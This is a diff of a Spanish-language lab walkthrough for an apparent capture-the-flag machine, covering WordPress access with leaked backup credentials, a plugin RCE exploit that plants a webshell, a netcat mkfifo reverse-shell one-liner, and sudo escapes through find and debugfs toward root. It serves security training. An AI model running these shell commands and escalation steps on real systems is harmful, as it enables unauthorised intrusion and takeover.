@@ -69,7 +69,7 @@ No parecen haber vulnerabilidades por el momento.
 ___
 
 #### FASE EXPLOTACIÓN:
-**Web**:  
+1. **Web**:  
 De dichas enumeraciónes, por el momento nos quedamos con `/backups`. Yendo a este endpoint vemos que podemos descargar un recurso: `databaseback2may.zip`. Lo hacemos.
 Primero revisamos localmente, sin extraer para estar seguros, con `unzip -l <zip>`. Vemos que contiene un único archivito llamado `29DBMay`.  
 Ahora procedemos a extraerlo con `unzip <zip>`. Le hacemos un `cat 29DBMay` y obtenemos las credenciales `developer:2wmy3KrGDRD%RsA7Ty5n71L^`.  
@@ -77,7 +77,7 @@ Investigando un poco con `hashid 2wmy3KrGDRD%RsA7Ty5n71L^` y en la web, vemos qu
 
 Entonces, procedemos a probar nuestras nuevas credenciales en el endpoint `/wp-login.php` y logramos **Footholding Web**.  
 
-**Sistema**:  
+2. **Sistema**:  
 Navegando por el dashboard encontramos otro endpoint interesante, por el cual podríamos pobrar subir una *WebShell* y así lograr **Acceso Inicial al Sistema**. Este recurso es `/wp-admin/media-new.php`. Al intentar subir algún archivo nos damos cuenta que no es posible, porque no tenemos los permisos como `developer`.  
 
 Entonces, probamos hacer más **Footprinting Web**. Encontramos que: 
@@ -94,24 +94,28 @@ Entonces, probamos hacer más **Footprinting Web**. Encontramos que:
 			
 * Hay otro usuario *admin* llamado `eric`.  
 
-Entones usamos la herramienta `searchsploit` para buscar **Exploits**. Después de algún tiempo, encontramos uno directo para RCE, para el **Plugin Modern Events Calendar Lite 5.16.2** de Wordpress. Lo descargamos con `searchsploit -m <exploit>`.  
+Entonces, usamos la herramienta `searchsploit` para buscar **Exploits**. Después de algún tiempo, encontramos uno directo para RCE, para el **Plugin Modern Events Calendar Lite 5.16.2** de Wordpress. Lo descargamos con `searchsploit -m <exploit>`.  
 
 Siguiendo las instrucciones del mismo, nos termina dando la URL de la webshell que acaba de subir:  
 `http://<IP_Whoiam>/wp-content/uploads/shell.php)`  
 
-Nos dirigimos allí en el navegador y nos abre una [PownyWebShell](https://github.com/flozz/p0wny-shell). Esta se lanza en propio browser. Es bastante limitada, pero nos da un **FootHolding en el Sistema**.  
+Nos dirigimos allí en el navegador y nos abre una [PownyWebShell](https://github.com/flozz/p0wny-shell). Esta se lanza en propio browser. Es bastante limitada, pero hacemos `whoami ==> www-data` y confirmamos **FootHolding en el Sistema**.  
 
-Entonces, hacemos rápidamente un `whoami` y nos devuelve `www-data`. Dicho esto, nos apuramos a lanzar una Reverse Shell para tener más control localmente. Para ello, preparamos un listener. En este caso, uso [Penelope](https://github.com/brightio/penelope). Corremos `penelope -i <IP_local> -p <puerto_local>` y queda escuchando. 
+2.1 **Mejorando el Entorno**  
 
-Primero vemos las herramientas instaladas en el sistema para ver con qué podemos correr la RevShell. Hacemos rápidamente `which python python2 python3 nc` y encontramos a `/usr/bin/nc`. Ahora vamos a https://www.revshells.com/ y probando y probando encontramos que la manera de lanzarla según la config de la víctima es con la versión portable (POSIX) ejecutado `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_local> <puerto_local> >/tmp/f`.  
+Dicho esto, ahora deberíamos lanzar una **Reverse Shell** para tener un mejor manejo localmente. Para ello, preparamos un **Listener**. En este caso, uso [Penelope](https://github.com/brightio/penelope). Corremos `penelope -i <IP_local> -p <puerto_local>` y queda a la escucha.  
 
-Una vez lograda la conexión, tenemos mucha más funcionalidad.  
+Ahora, debemos ver las herramientas instaladas en el sistema para lanzar la *RevShell*. Hacemos `which python python2 python3 nc ...` y encontramos a `/usr/bin/nc`. Ahora vamos a https://www.revshells.com/ y encontramos que la manera de lanzarla según el sistema de la víctima, es con la versión portable (POSIX) de `nc`. Ejecutamos `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_local> <puerto_local> >/tmp/f`.  
 
-Lanzamos `whoami` y somos `www-data`.  
+Una vez lograda la conexión, tenemos mucha más funcionalidad y mejor entorno.  
+
+___
 
 #### FASE POST-EXPLOTACIÓN: Elevar Privilegios
 
-Ahora sí, una vez que tenemos **FootHolding** es turno de **Enumerar Usuarios**. Lo hacemos de las siguientes maneras:  
+Ahora sí, una vez que tenemos **FootHolding en el Sistema** hay que pensar en **Elevar Privilegios**.  
+
+1. **Enumerar Usuarios**:  
 
 * cat /etc/passwd
 * ls -l /home/
@@ -123,32 +127,30 @@ Conseguimos 2 usuarios relevantes:
 
 > Ambos usan /bin/bash.  
 
-Bien, ahora, lo que debemos hacer es buscar **Binarios SUID** y **Privilegios Sudo**.  
-Para el primero corremos `find / -type f -perm -4000 2>/dev/null | xargs ls -l`.  
-Esto no nos devuelve ninguno relevante.  
+2. Buscar **Binarios SUID** y **Privilegios Sudo**, antes de **Buscar Credenciales**:  
 
-Entonces, probamos `sudo -l`:  
-`(rafa) NOPASSWD: /usr/bin/find`  
+2.1. Corremos `find / -type f -perm -4000 2>/dev/null | xargs ls -l`. Nada interesante.  
 
-> Esto significa que podemos correr `sudo` con `find` como `rafa` y sin password.  
+2.2. Lanzamos `sudo -l`. Nos devuelve: `(rafa) NOPASSWD: /usr/bin/find`  
 
-Vamos a [GTFOBins](https://gtfobins.github.io/) y buscamos `find` filtrando por `sudo`. Terminamos corriendo `sudo -u rafa find . -exec /bin/bash \; -quit` y logramos hacer **Movimiento Lateral** al usuario `rafa`.  
+> Podemos usar `/usr/bin/find` con Privilegios Elevados como `rafa` y sin password.  
 
-Ahora desde este nuevo usuario, volvemos a ejecutar `sudo -l` y nos devuelve:  
-`(ruben) NOPASSWD: /usr/sbin/debugfs`  
+Vamos a [GTFOBins](https://gtfobins.github.io/) y buscamos `find` filtrando por `sudo`.  
+Terminamos corriendo `sudo -u rafa find . -exec /bin/bash \; -quit`. Logramos **Movimiento Lateral** al usuario `rafa`.  
 
-> Podemoos lanzar `debugfs` con Privilegios Elevados como el usuario `ruben` y sin contraseña.  
+Ahora, desde este nuevo usuario, volvemos a ejecutar `sudo -l`: `(ruben) NOPASSWD: /usr/sbin/debugfs`.  
 
-Debemos a hacer **Explotación Sudo** devuelta para poder hacer **Movimiento Lateral** hacia `ruben`. Vamos a la *GTFOBins* nuevamente y buscamos `debugfs` filtrando por `sudo`.  
+> Podemoos lanzar `/usr/sbin/debugfs` con Privilegios Elevados como `ruben` y sin contraseña.  
 
-Terminamos lanzando `sudo -u ruben /usr/sbin/debugfs`, nos sale un prompt, le damos a `!/bin/bash` y ya somos `ruben`.  
+Debemos a hacer **Explotación Sudo** devuelta, para poder hacer **Movimiento Lateral** hacia `ruben`. Vamos a la *GTFOBins* nuevamente, y buscamos `debugfs`, filtrando por `sudo`.  
 
-Ahora,  otra vez, chequeamos los **Privilegios Sudo** con `sudo -l` y nos devuelve:  
-`(ALL) NOPASSWD: /bin/bash /opt/penguin.sh`
+Terminamos lanzando `sudo -u ruben /usr/sbin/debugfs`. Nos sale un prompt y le damos a `!/bin/bash`. Ya somos `ruben`.  
 
-> Podemos lanzar dicho script como root  
+Ahora,  otra vez, chequeamos los **Privilegios Sudo** con `sudo -l`. Nos devuelve: `(ALL) NOPASSWD: /bin/bash /opt/penguin.sh`  
 
-Entonces, siguiente paso, es saber qué hace el script para intentar explotarlo. Lo averiguamos con `cat /opt/penguin.sh`. Vemos el código:  
+> Podemos lanzar dicho script con Privilegios Elevados como root.  
+
+Entonces, siguiente paso, es saber **Qué Hace el Script** para intentar explotarlo. Lo averiguamos con `cat /opt/penguin.sh`. Vemos su código:  
 
 ```
 #!/bin/bash
